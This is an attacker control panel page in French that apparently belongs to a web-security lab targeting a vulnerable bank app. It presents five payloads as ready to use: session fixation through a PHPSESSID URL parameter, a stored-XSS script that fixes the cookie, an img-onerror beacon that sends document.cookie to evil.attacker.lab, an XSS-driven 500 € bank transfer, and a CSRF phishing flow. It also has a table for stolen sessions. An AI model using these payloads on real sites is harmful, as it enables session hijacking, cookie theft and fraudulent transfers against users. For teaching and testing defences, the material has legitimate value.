<?php ?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>☠ Evil Control Panel</title>
    <link rel="stylesheet" href="/style.css">
</head>
<body class="evil">

<header>
    <h1>☠ Evil Control Panel</h1>
    <div class="status">
        <span class="led" id="led"></span>
        <span>Listener actif sur <code>evil.attacker.lab/collect.php</code></span>
        <span class="count">Sessions volées : <strong id="count">0</strong></span>
    </div>
</header>

<section class="payloads">
    <h2>Payloads prêts à l'emploi</h2>

    <details open>
        <summary>Vecteur A — Fixation via paramètre URL (PHPSESSID)</summary>
        <pre><code id="payload-a">http://vuln.bank.local/login.php?PHPSESSID=ATTACKERfixedSID001</code></pre>
        <p>Envoyer ce lien à la victime (phishing). PHP avec <code>use_trans_sid=1</code> et <code>use_strict_mode=0</code> accepte le SID imposé.</p>
    </details>

    <details>
        <summary>Vecteur B — Fixation par XSS stocké</summary>
        <pre><code>&lt;script&gt;
document.cookie = "PHPSESSID=ATTACKERfixedSID001; path=/";
fetch("http://evil.attacker.lab/collect.php?m=stored-xss-cookie-set"
      + "&amp;sid=ATTACKERfixedSID001"
      + "&amp;url=" + encodeURIComponent(location.href));
&lt;/script&gt;</code></pre>
        <p>Posté dans un commentaire : s'exécute pour tout visiteur, écrase son cookie et ping notre serveur.</p>
    </details>

    <details>
        <summary>Vecteur C — Exfiltration directe du cookie (si non-HttpOnly)</summary>
        <pre><code>&lt;img src=x onerror="
  new Image().src='http://evil.attacker.lab/collect.php?m=stolen'
    + '&amp;c=' + encodeURIComponent(document.cookie)
    + '&amp;url=' + encodeURIComponent(location.href);
"&gt;</code></pre>
        <p>JS lit le cookie (non-HttpOnly) et l'envoie en image-beacon.</p>
    </details>

    <details>
        <summary>Vecteur D — Virement XSS (depuis le compte de la victime)</summary>
        <pre><code>&lt;script&gt;
fetch('/transfer.php?to_iban=FR7630001007940000000000042&amp;amount=500&amp;note=pwned');
&lt;/script&gt;</code></pre>
        <p>S'exécute dans le contexte de la victime connectée → virement de 500 € vers Mallory.</p>
    </details>

    <details>
        <summary>Vecteur E — CSRF email (deux étapes)</summary>
        <pre><code>Étape 1 — Envoyer l'email de phishing :
  http://evil.attacker.lab/csrf-email.html

Étape 2 — La victime clique "Sécuriser mon compte" sur :
  http://evil.attacker.lab/csrf-mail.html
  → déclenche GET /transfer.php?to_iban=...&amp;amount=500</code></pre>
        <p>Le navigateur de la victime envoie automatiquement son cookie (SameSite=Lax + GET = contournement).</p>
    </details>
</section>

<section class="harvest">
    <h2>Sessions interceptées</h2>
    <table id="tbl">
        <thead>
            <tr>
                <th>#</th>
                <th>Quand</th>
                <th>SID</th>
                <th>Cookie complet</th>
                <th>Méthode</th>
                <th>URL victime</th>
                <th>IP</th>
                <th>UA</th>
                <th></th>
            </tr>
        </thead>
        <tbody id="rows"></tbody>
    </table>
</section>

<script src="/dashboard.js"></script>
</body>
</html>
